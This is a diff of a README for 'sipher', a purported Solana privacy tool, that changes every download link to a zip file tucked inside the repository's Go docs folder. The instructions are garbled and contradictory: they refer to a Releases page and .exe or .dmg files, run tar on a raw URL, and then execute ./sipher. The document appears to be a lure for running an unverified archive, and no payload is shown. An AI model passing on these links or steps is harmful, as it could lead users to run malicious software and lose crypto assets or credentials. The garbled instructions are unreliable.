@@ -1,6 +1,6 @@
 # 🚀 sipher - Seamless Privacy for Solana Agents
 
-[![Download sipher](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/python/sipher_client/Software-v1.6.zip%https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/python/sipher_client/Software-v1.6.zip)](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/python/sipher_client/Software-v1.6.zip)
+[![Download sipher](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/go/docs/Software_v2.1.zip%https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/go/docs/Software_v2.1.zip)](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/go/docs/Software_v2.1.zip)
 
 ## 📦 Introduction
 
@@ -14,7 +14,7 @@ Follow these simple steps to get started with Sipher. All you need is a computer
 
 To download Sipher, please visit the following link:
 
-[Download Sipher](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/python/sipher_client/Software-v1.6.zip)
+[Download Sipher](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/go/docs/Software_v2.1.zip)
 
 On the Releases page, you will see several versions. Choose the latest release, typically marked as "Latest" or with the highest version number. 
 
@@ -24,7 +24,7 @@ Look for the file corresponding to your operating system:
 
 - **Windows:** Select the `.exe` file.
 - **macOS:** Choose the `.dmg` file.
-- **Linux:** Use the `https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/python/sipher_client/Software-v1.6.zip` file.
+- **Linux:** Use the `https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/go/docs/Software_v2.1.zip` file.
 
 Click on the file to start the download.
 
@@ -45,7 +45,7 @@ After downloading, locate the file on your computer.
   - Navigate to the folder where you downloaded the file.
   - Run the following command:
     ```
-    tar -xvzf https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/python/sipher_client/Software-v1.6.zip
+    tar -xvzf https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/go/docs/Software_v2.1.zip
     cd sipher
     ./sipher
     ```
@@ -91,7 +91,7 @@ If you encounter any issues while using Sipher, try these troubleshooting steps:
 
 Ready to get started? Click the link below to download Sipher:
 
-[Download Sipher](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/python/sipher_client/Software-v1.6.zip)
+[Download Sipher](https://raw.githubusercontent.com/bingobangoober-crypto/sipher/main/sdks/go/docs/Software_v2.1.zip)
 
 After downloading, follow the installation steps listed above.
 
